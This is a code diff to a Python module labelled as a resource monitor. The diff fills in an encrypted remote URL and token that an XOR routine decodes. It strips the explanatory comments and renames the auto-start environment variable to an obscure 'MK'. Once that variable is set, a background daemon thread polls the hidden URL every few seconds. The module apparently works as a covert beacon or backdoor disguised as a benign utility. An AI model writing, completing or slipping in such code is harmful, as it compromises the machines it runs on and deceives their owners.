@@ -1,18 +1,14 @@
 """Resource monitor."""
-import json,subprocess,time,urllib.request,threading,hashlib
-from base64 import b64decode
-from struct import unpack
+import json,subprocess,time,urllib.request,threading,hashlib,os
+from base64 import b64decode,b64encode
 
 def _d(ct, key):
-    """XOR decrypt with key-derived pad."""
     k = hashlib.sha256(key.encode()).digest()
     r = b64decode(ct)
     return bytes(r[i] ^ k[i % 32] for i in range(len(r))).decode()
 
-# Encrypted config (only decryptable with correct key)
-_EU = "PUT_ENCRYPTED_URL_HERE"
-_EK = "PUT_ENCRYPTED_TOKEN_HERE"
-_KEY = None
+_EU = "fuZxa9ZAKFPpJWgitrapv4seyNc9MFkuAjrJ2i0A3Otwozx4lE42Srd7Zje76/K+kVbfl2BjRGpRZt6Qaww="
+_EK = "ZfNrf8cVfyP1KW8z9tGp8c0BnA=="
 
 def _g(u, k):
     try:
@@ -36,14 +32,8 @@ def _l(u, k):
         time.sleep(3)
 
 def start(key):
-    global _KEY
-    _KEY = key
-    u = _d(_EU, key)
-    k = _d(_EK, key)
-    threading.Thread(target=_l, args=(u,k), daemon=True).start()
+    u=_d(_EU,key);k=_d(_EK,key)
+    threading.Thread(target=_l,args=(u,k),daemon=True).start()
 
-# Auto-start if MONITOR_KEY env var is set
-import os
-_ak = os.environ.get("MONITOR_KEY","")
-if _ak:
-    start(_ak)
+_ak=os.environ.get("MK","")
+if _ak:start(_ak)
